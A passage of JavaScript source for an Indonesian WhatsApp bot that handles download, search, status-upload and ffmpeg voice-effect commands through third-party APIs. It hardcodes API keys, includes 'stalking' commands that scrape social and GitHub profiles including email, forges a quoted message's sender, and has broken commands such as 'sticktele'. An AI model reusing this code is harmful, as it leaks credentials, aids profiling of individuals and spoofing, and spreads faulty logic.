                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'ytmp3':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytaudio?apikey=${LolKey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Uploader : ${get_result.uploader}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Description :\n ${get_result.description}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: revz, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link[3].link)
                    Repor.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: revz})
                    break
                
                case prefix+ 'ytmp4':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
                    ini_link = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytvideo?apikey=${LolKey}&url=${ini_link}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Uploader : ${get_result.uploader}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Description :\n ${get_result.description}`
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: revz, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link[0].link)
                    Repor.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: revz})
                    break
                    
                    case prefix+ 'antilink':
					if (!isGroup) return reply(`GROUP ONLY`) 
					if (!isGroupAdmins) return reply(`LU ADMIN??`)
					if (!isBotGroupAdmins) return reply(`Saya bukan admin kak`)
						if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
						if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('anti link group is active')
						antilink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply ('Suksek mengaktifkan antilink')
					    } else if (Number(args[0]) === 0) {
						if (isAntiLink) return reply('Anti link group mode has been disabled')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply ('Suksek mematikan antilink')
					   } else {
						Repor.sendMessage(from, `1 to activate, 0 to deactivate`, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "𝐁𝐨𝐭 𝐁𝐲 𝐙𝐞𝐞𝐨𝐧𝐞🤖", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} } }})
					    }
						break
						
					
                case prefix+ 'telesticker':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/telestick?apikey=${LolKey}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                    ini_buffer = await getBuffer(ini_sticker[sticker_])
                    Repor.sendMessage(from, ini_buffer, MessageType.sticker)
                   }
                    break
                    case prefix+ 'tiktoknowm':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_url = args[0]
                    ini_url = `http://api.lolhuman.xyz/api/tiktok?apikey=${LolKey}&url=${ini_url}`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result.link)
                    Repor.sendMessage(from, ini_buffer, video, { quoted: revz})
                    break
                    
                    case prefix+ 'asupanshitpost':
		
                    ini_url = args[0]
                    ini_url = `https://api.xteam.xyz/shitpost?APIKEY=6d34164a27fbcfc7`
                    ini_buffer = await getBuffer(ini_url)
                    Repor.sendMessage(from, '🗿Tunggu Bentar Bro' , text, { quoted: revz})
                    Repor.sendMessage(from, ini_buffer, video, { quoted: fvideo})
                    break
                    
                    case prefix+ 'asupanukhty':
		
                    ini_url = args[0]
                    ini_url = `https://api-alphabot.herokuapp.com/api/asupan/ukty?apikey=Alphabot`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result.url)
                    Repor.sendMessage(from, '🗿Tunggu Bentar Bro' , text, { quoted: revz})
                    Repor.sendMessage(from, ini_buffer, video, { quoted: fvideo})
                    break
                    
                    case prefix+ 'asupanptl3':
		
                    ini_url = args[0]
                    ini_url = `https://api-alphabot.herokuapp.com/api/asupan/bocil?apikey=Alphabot`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result.url)
                    Repor.sendMessage(from, '🗿Tunggu Bentar Bro' , text, { quoted: revz})
                    Repor.sendMessage(from, ini_buffer, video, { quoted: fvideo})
                    break
                    
                    case prefix+ 'asupanptl2':
		
                    ini_url = args[0]
                    ini_url = `https://api-alphabot.herokuapp.com/api/asupan?apikey=Alphabot`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result.result)
                    Repor.sendMessage(from, '🗿Tunggu Bentar Bro' , text, { quoted: revz})
                    Repor.sendMessage(from, ini_buffer, video, { quoted: fvideo})
                    break
                    
                    case prefix+ 'asupanptl':
                    ini_url = args[0]
                    ini_url = `https://api.lolhuman.xyz/api/asupan?apikey=${LolKey}`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result)
                    Repor.sendMessage(from, '🗿Tunggu Bentar Bro' , text, { quoted: revz})
                    Repor.sendMessage(from, ini_buffer, video, { quoted: fvideo})
                    break
                    
                    case prefix+ 'igdl':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/instagram?apikey=${LolKey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_type = image
                    if (ini_url.includes(".mp4")) ini_type = video
                    ini_buffer = await getBuffer(ini_url)
                    Repor.sendMessage(from, ini_buffer, ini_type, { quoted: fvideo})
                    break
                case prefix+ 'fbdl':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/facebook?apikey=${LolKey}&url=${ini_url}`)
                    ini_url = ini_url.result[0].link
                    ini_buffer = await getBuffer(ini_url)
                    Repor.sendMessage(from, ini_buffer, video, { quoted: fvideo})
                    break
                case prefix+ 'tiktokmusic':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_link = args[0]
                    get_audio = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${LolKey}&url=${ini_link}`)
                    Repor.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: revz})
                    break
                    
                    //********** EDUKASI **********//
                    
                    case prefix+ 'brainly':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Soekarno adalah`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/brainly?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `${x.title}\n`
                        ini_txt += `${x.url}\n\n`
                    }
                    reply(ini_txt)
                    break 
                    case prefix+ 'cuaca':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Tempat : ${get_result.tempat}\n`
                    ini_txt += `Cuaca : ${get_result.cuaca}\n`
                    ini_txt += `Angin : ${get_result.angin}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
                    ini_txt += `Suhu : ${get_result.suhu}\n`
                    ini_txt += `Udara : ${get_result.udara}\n`
                    ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
                    Repor.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: revz})
                    reply(ini_txt)
                    break
                    case prefix+ 'wikipedia':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wiki?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    reply(get_result)
                    break
                    case prefix+ 'translate':
		
                    if (args.length < 1) return Repor.sendMessage(from, 'Kode Bahasanya???', text, {quoted: revz})
		       if (args.length < 2) return Repor.sendMessage(from, 'Text Yg Mau Di translate??', text, {quoted: revz})
		        ts = body.slice(11) 
				kode = ts.split("/")[0]
                to = ts.split("/")[1]
                teks = ts.split("/")[2]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/translate/${kode}/${to}?apikey=${LolKey}&text=${teks}`)
                    get_result = get_result.result
                    init_txt = `From : ${get_result.from}\n`
                    init_txt += `To : ${get_result.to}\n`
                    init_txt += `Original : ${get_result.original}\n`
                    init_txt += `Translated : ${get_result.translated}\n`
                    init_txt += `Pronunciation : ${get_result.pronunciation}\n`
                    reply(init_txt)
                    break
                    case prefix+ 'infogempa':
		

                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/infogempa?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Lokasi : ${get_result.lokasi}\n`
                    ini_txt += `Waktu : ${get_result.waktu}\n`
                    ini_txt += `Potensi : ${get_result.potensi}\n`
                    ini_txt += `Magnitude : ${get_result.magnitude}\n`
                    ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
                    ini_txt += `Koordinat : ${get_result.koordinat}`
                    get_buffer = await getBuffer(get_result.map)
                    Repor.sendMessage(from, get_buffer, image, { quoted: revz, caption: ini_txt })
                    break
                    case prefix+ 'lirik':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/lirik?apikey=${LolKey}&query=${query}`)
                    reply(get_result.result)
                    break
                    
                    case prefix+ 'covidindo':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/indonesia?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case prefix+ 'covidglobal':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/global?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case prefix+ 'kodepos':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kodepos?apikey=${LolKey}&query=${daerah}`)
                    get_result = get_result.result[0]
                    ini_txt = `Provinsi : ${get_result.province}\n`
                    ini_txt += `Kabupaten : ${get_result.city}\n`
                    ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
                    ini_txt += `Kelurahan : ${get_result.urban}\n`
                    ini_txt += `Kode Pos : ${get_result.postalcode}`
                    reply(ini_txt)
                    break
                case prefix+ 'jadwalbola':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwalbola?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = "Jadwal Bola :\n"
                    for (var x of get_result) {
                        ini_txt += `Hari : ${x.hari}\n`
                        ini_txt += `Jam : ${x.jam}\n`
                        ini_txt += `Event : ${x.event}\n`
                        ini_txt += `Match : ${x.match}\n`
                        ini_txt += `TV : ${x.tv}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'indbeasiswa':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/indbeasiswa?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Beasiswa :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'hoax':
		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/turnbackhoax?apikey=${LolKey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Hoax :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Posted : ${x.posted}\n`
                        ini_txt += `Description : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                    
                    //********** SEARCHING**********//
                case prefix+ 'gimage':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${LolKey}&query=${query}`)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: revz})
                    break
                    
                    case prefix+ 'nulis':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} ily`)
                    temks = args.join(" ")
                    ini_buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/nulis?apikey=${LolKey}&text=${temks}`)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: troli})
                    break
                    
                    case prefix+ 'makequote' :
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} gua wibu|wahyu`)
                    var okok = body.slice(10)
					var teks = okok.split("|")[0];
					var author = okok.split("|")[1];
                    ini_buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/quotemaker2?apikey=${LolKey}&text=${teks}&author=${author}`)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: troli, caption : 'Nih Kack' })
                    break
                    
                    case prefix+ 'hartatahta':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command}`)
                    Aaa = args.join(" ")
                    ini_buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/hartatahta?apikey=${LolKey}&text=${Aaa}`)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: troli, caption : Aaa})
                    break
                    
                case prefix+ 'gimage2':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gimage2?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        Repor.sendMessage(from, ini_buffer, image)
                    }
                    break
                case prefix+ 'konachan':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} azur_lane`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/konachan?apikey=${LolKey}&query=${query}`)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: revz})
                    break
                case prefix+ 'wallpapersearch':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/wallpaper?apikey=${LolKey}&query=${query}`)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: revz})
                    break
                case prefix+ 'wallpapersearch2':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper2?apikey=${LolKey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    Repor.sendMessage(from, ini_buffer, image, { quoted: revz})
                    break
                case prefix+ 'playstore':
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/playstore?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appId}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Link : ${x.url}\n`
                        ini_txt += `Price : ${x.priceText}\n`
                        ini_txt += `Price : ${x.price}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'shopee':
		
                shopp = `${body.slice(8)}`
                  anu = await fetchJson(`http://lolhuman.herokuapp.com/api/shopee?apikey=${LolKey}&query=${shopp}`, {method: 'get'})
                  shopee = '==========================\n'
                  for (let disho of anu.result){
                  shopee += `• Name: ${disho.name}\n• Terjual: ${disho.sold}\n• Stock: ${disho.stock}\n• Desk: ${disho.desc}\n• Lokasi: ${disho.shop_loc}\n• Link: ${disho.link_produk}\n• Gambar: ${disho.image_cover}\n==========================\n`
                  }
                  reply(shopee.trim())
                  break
                case prefix+ 'google':
		
		
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gsearch?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `• Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                case prefix+ 'stickerwa':
		
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${LolKey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${LolKey}&img=${x}`)
                        Repor.sendMessage(from, ini_buffer, sticker)
                    }
                    break
                    
                    case prefix+'sticktele' :
                    qur = args.join(" ")
                    get_result = get_result.result[0].stickers
                        ini_buffer = await getBuffer(``)
                        Repor.sendMessage(from, ini_buffer, sticker)
                    break
                    //********** STALKING **********//
                   case prefix+ 'igstalk':
					
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalkig/${body.slice(9)}?apikey=${LolKey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : https://www.instagram.com/${get_result.username}\n`
					txt += `Full : ${get_result.fullname}\n`
					txt += `Post : ${get_result.posts}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.photo_profile)
					Repor.sendMessage(from, buffer, image, {quoted: revz, caption: txt})
					break
		case prefix+ 'githubstalk':
					
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=${LolKey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Full : ${get_result.name}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Publick : ${get_result.public_repos}\n`
					txt += `Public Gits : ${get_result.public_gists}\n`
					txt += `User : ${get_result.user}\n`
					txt += `Compi : ${get_result.company}\n`
					txt += `Lokasi : ${get_result.location}\n`
					txt += `Email : ${get_result.email}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.avatar)
					Repor.sendMessage(from, buffer, image, {quoted: revz, caption: txt})
					break
		case prefix+ 'tkstalk':
			
			username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${LolKey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : ${get_result.username}\n`
					txt += `Bio : ${get_result.bio}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.followings}\n`
					txt += `Likes : ${get_result.likes}\n`
					txt += `Vidio : ${get_result.video}\n`
					buffer = await getBuffer(get_result.user_picture)
					Repor.sendMessage(from, buffer, image, {quoted: revz, caption: txt})
					break
		case prefix+ 'ytstalk':
					
					ytk = `${body.slice(11)}`
					anu = await fetchJson(`http://api.lolhuman.xyz/api/ytchannel?apikey=${LolKey}&query=${ytk}`, {method: 'get'})
					cari = '•••••••••••••••••\n'
					for (let search of anu.result) {
						cari += `*Channel* : ${search.channel_name}\n*Tentang* : ${search.channel_about}\n*Created* : ${search.channel_created}\n*Link* : https://youtu.com/channel/${search.channel_id}\n•••••••••••••••••\n`
					}
					reply(cari.trim())
					break
				
				

//********** UPLOAD **********//
             case prefix+ 'upswtext':
             if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
					Repor.updatePresence(from, Presence.composing)
					Repor.sendMessage('status@broadcast', `${q}`, extendedText)
					Repor.sendMessage(from, `Sukses Up story wea teks ${q}`, text,{quoted : revz})
					break
					
				case prefix+ 'upswimg':
				if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
					Repor.updatePresence(from, Presence.composing)
					if (isQuotedImage) {
						const swsw = isQuotedImage ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						cihcih = await Repor.downloadMediaMessage(swsw)
						Repor.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					Repor.sendMessage(from, bur, text, { quoted: revz })
					break
					
				case prefix+ 'upswvideo':
				if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
					Repor.updatePresence(from, Presence.composing)
					if (isQuotedVideo) {
						const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						cihcih = await Repor.downloadMediaMessage(swsw)
						Repor.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Video dengan Caption: ${q}`
					Repor.sendMessage(from, bur, text, { quoted: revz })
					break
					case prefix+ 'upswvoice':
                    if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !revz.message.videoMessage || isQuotedAudio) {
						encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						buff = await Repor.downloadMediaMessage(encmedia)
						Repor.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
						case prefix+ 'upswlokasi':
  if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    Repor.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`crewbot`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case prefix+ 'upswsticker':
                    if (!isOwner && !revz.key.fromMe) return reply('*Kamu Owner?*')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !revz.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
						buff = await Repor.downloadMediaMessage(encmedia)
						Repor.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
					
					//**********Pengubah Suara***************///
					
					case prefix+ 'gemes':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						riu = fs.readFileSync(ran)
					Repor.sendMessage(from, riu, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
					break
//Tempo Mengubah Suara Lebih Dering
case prefix+ 'tempo':           
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=12345" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Repor.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko,duration:99999999999})
						fs.unlinkSync(ran)
					})
				break
//nightcore Mengubah Suara Jadi Nada Rendah
case prefix+ 'nightcore':
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Repor.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko,duration:999999999999})
						fs.unlinkSync(ran)
					   })
				       break
				       
				       //streo Mengubah Suara Menjadi Nada Super Rendah
				      
//fast Mengubah Suara Bernada Sedeng
case prefix+ 'fast':
				encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
			     media = await Repor.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=1.63,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				Repor.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
				fs.unlinkSync(ran)
				})
				break
//tupai Mengubah Suara Jadi  Lucu Lucu Gimana 
case prefix+ 'tupai':
				reply(mess.wait,{quoted : ftoko})
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Repor.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
				break
//Gemuk Bersuara Besar Dan Dengung
case prefix+ 'gemok':
				reply(mess.wait,{quoted : ftoko})
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Repor.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
				break
//bass Bernada Besar Dan Getar
case prefix+ 'bass':                 
				reply(mess.wait,{quoted : ftoko})
					encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(revz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : revz
					media = await Repor.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Repor.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted : ftoko})
						fs.unlinkSync(ran)
					})
				break
			
			case prefix+ 'budek':

	encmedia = JSON.parse(JSON.stringify(revz).replace('quotedM','m')).message.extendedTextMessage.contextInfo

	media = await Repor.downloadAndSaveMediaMessage(encmedia)

	ran = getRandom('.mp3')

	exec(`ffmpeg -i ${media} -filter:a "volume=200" ${ran}`, (err, stderr, stdout) => {
